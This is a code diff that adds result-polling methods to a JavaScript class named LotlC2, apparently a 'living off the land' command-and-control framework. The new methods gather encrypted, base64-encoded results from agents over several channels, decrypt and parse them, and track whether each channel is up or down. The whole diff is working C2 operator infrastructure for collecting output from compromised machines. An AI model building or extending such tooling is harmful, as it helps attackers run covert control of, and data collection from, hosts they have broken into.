@@ -154,6 +154,43 @@ class LotlC2 {
     }
   }
 
+  async pollResults(channel, agentId) {
+    const ch = this.channels[channel];
+    if (!ch || typeof ch.pollResults !== 'function') return [];
+    try {
+      const results = await ch.pollResults(agentId);
+      this.channelStatus[channel] = 'up';
+      return results.map(item => {
+        try {
+          const decrypted = this._decrypt(this._b64Decode(item.result));
+          const parsed = JSON.parse(decrypted);
+          return {
+            id: item.id,
+            agentId: parsed.agentId,
+            result: parsed.result,
+            timestamp: parsed.timestamp,
+            channel
+          };
+        } catch (e) {
+          return null;
+        }
+      }).filter(Boolean);
+    } catch (err) {
+      this.channelStatus[channel] = 'down';
+      return [];
+    }
+  }
+
+  async pollAllResults() {
+    const allResults = [];
+    for (const ch of this.channelPriority) {
+      if (!this.channels[ch] || typeof this.channels[ch].pollResults !== 'function') continue;
+      const results = await this.pollResults(ch, '');
+      allResults.push(...results);
+    }
+    return allResults;
+  }
+
   async testChannel(channel) {
     const ch = this.channels[channel];
     if (!ch) return { channel, status: 'not_configured' };
